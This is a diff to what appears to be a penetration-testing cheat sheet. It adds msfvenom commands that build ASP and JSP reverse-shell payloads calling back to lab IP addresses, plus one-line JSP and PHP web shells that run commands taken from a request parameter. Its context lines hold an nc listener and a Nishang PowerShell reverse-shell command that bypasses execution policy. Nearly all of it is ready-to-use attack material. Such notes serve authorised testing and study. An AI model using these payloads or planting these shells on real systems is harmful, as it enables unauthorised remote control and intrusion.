@@ -140,7 +140,8 @@ service postgresql restart <br />
 msfdb reinit  <br />
 cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />
 
-
+<br />
+<br />
 ## Windows Shell
 ```sh 
 //Non-Staged :  (windows/shell_reverse_tcp) && nc -nlvp 443
@@ -155,8 +156,16 @@ cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />
 ```
 -Creating Webshell
 ```sh 
-ASP :  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.45 LPORT=2323 -f asp -a x86 --platform win -o shell.asp
+ASP : msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.45 LPORT=2323 -f asp -a x86 --platform win -o shell.asp
+      
+JSP : msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.42 LPORT=4444 -f raw > shell.jsp
+      JSP webshell <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+      
+PHP : <?php echo passthru($_GET['cmd']); ?>
+      <?php echo shell_exec($_GET['cmd']); ?>
 ```
+ref : https://netsec.ws/?p=331
+
 **Powershell Nishang**<br />
 ```sh 
 powershell -exec bypass -c Import-Module .\Invoke-PowerShellTcp.ps1;Invoke-PowerShellTcp -Reverse -IPAddress 10.*.*.* -Port 1234
